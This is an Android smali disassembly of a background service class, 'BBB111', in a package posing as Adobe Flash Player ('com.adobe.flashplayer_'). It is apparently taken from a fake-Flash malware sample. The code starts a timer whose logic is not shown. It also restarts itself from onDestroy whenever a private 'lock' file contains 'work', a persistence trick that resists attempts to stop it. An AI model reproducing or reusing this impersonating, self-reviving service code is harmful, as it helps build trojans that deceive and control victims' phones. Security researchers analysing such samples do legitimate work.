.class public Lcom/adobe/flashplayer_/BBB111;
.super Landroid/app/Service;
.source "BBB111.java"


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 24
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    return-void
.end method

.method static synthetic access$0(Lcom/adobe/flashplayer_/BBB111;Ljava/lang/String;)Ljava/lang/String;
    .locals 1

    .prologue
    .line 82
    invoke-direct {p0, p1}, Lcom/adobe/flashplayer_/BBB111;->readConfig(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    return-object v0
.end method

.method private readConfig(Ljava/lang/String;)Ljava/lang/String;
    .locals 7
    .param p1, "config"    # Ljava/lang/String;

    .prologue
    .line 84
    const-string v4, "!"

    .line 87
    .local v4, "ret":Ljava/lang/String;
    :try_start_0
    invoke-virtual {p0, p1}, Lcom/adobe/flashplayer_/BBB111;->openFileInput(Ljava/lang/String;)Ljava/io/FileInputStream;

    move-result-object v1

    .line 89
    .local v1, "inputStream":Ljava/io/InputStream;
    if-eqz v1, :cond_0

    .line 90
    new-instance v2, Ljava/io/InputStreamReader;

    invoke-direct {v2, v1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 91
    .local v2, "inputStreamReader":Ljava/io/InputStreamReader;
    new-instance v0, Ljava/io/BufferedReader;

    invoke-direct {v0, v2}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 92
    .local v0, "bufferedReader":Ljava/io/BufferedReader;
    const-string v3, ""

    .line 93
    .local v3, "receiveString":Ljava/lang/String;
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    .line 95
    .local v5, "stringBuilder":Ljava/lang/StringBuilder;
    :goto_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v3

    if-nez v3, :cond_1

    .line 99
    invoke-virtual {v1}, Ljava/io/InputStream;->close()V

    .line 100
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    .line 107
    .end local v0    # "bufferedReader":Ljava/io/BufferedReader;
    .end local v1    # "inputStream":Ljava/io/InputStream;
    .end local v2    # "inputStreamReader":Ljava/io/InputStreamReader;
    .end local v3    # "receiveString":Ljava/lang/String;
    .end local v5    # "stringBuilder":Ljava/lang/StringBuilder;
    :cond_0
    :goto_1
    return-object v4

    .line 96
    .restart local v0    # "bufferedReader":Ljava/io/BufferedReader;
    .restart local v1    # "inputStream":Ljava/io/InputStream;
    .restart local v2    # "inputStreamReader":Ljava/io/InputStreamReader;
    .restart local v3    # "receiveString":Ljava/lang/String;
    .restart local v5    # "stringBuilder":Ljava/lang/StringBuilder;
    :cond_1
    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_0
    .catch Ljava/io/FileNotFoundException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    goto :goto_0

    .line 103
    .end local v0    # "bufferedReader":Ljava/io/BufferedReader;
    .end local v1    # "inputStream":Ljava/io/InputStream;
    .end local v2    # "inputStreamReader":Ljava/io/InputStreamReader;
    .end local v3    # "receiveString":Ljava/lang/String;
    .end local v5    # "stringBuilder":Ljava/lang/StringBuilder;
    :catch_0
    move-exception v6

    goto :goto_1

    .line 104
    :catch_1
    move-exception v6

    goto :goto_1
.end method


# virtual methods
.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1
    .param p1, "arg0"    # Landroid/content/Intent;

    .prologue
    .line 29
    const/4 v0, 0x0

    return-object v0
.end method

.method public onCreate()V
    .locals 7

    .prologue
    .line 34
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    .line 35
    const/4 v6, 0x0

    .line 36
    .local v6, "ff":Z
    new-instance v0, Lcom/adobe/flashplayer_/BBB111$1;

    const-wide/32 v2, 0x15f90

    const-wide/16 v4, 0x7d0

    move-object v1, p0

    invoke-direct/range {v0 .. v5}, Lcom/adobe/flashplayer_/BBB111$1;-><init>(Lcom/adobe/flashplayer_/BBB111;JJ)V

    .line 76
    invoke-virtual {v0}, Lcom/adobe/flashplayer_/BBB111$1;->start()Landroid/os/CountDownTimer;

    .line 79
    return-void
.end method

.method public onDestroy()V
    .locals 2

    .prologue
    .line 114
    const-string v0, "lock"

    invoke-direct {p0, v0}, Lcom/adobe/flashplayer_/BBB111;->readConfig(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "work"

    invoke-virtual {v0, v1}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 115
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/adobe/flashplayer_/BBB111;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0, v0}, Lcom/adobe/flashplayer_/BBB111;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 118
    :cond_0
    return-void
.end method
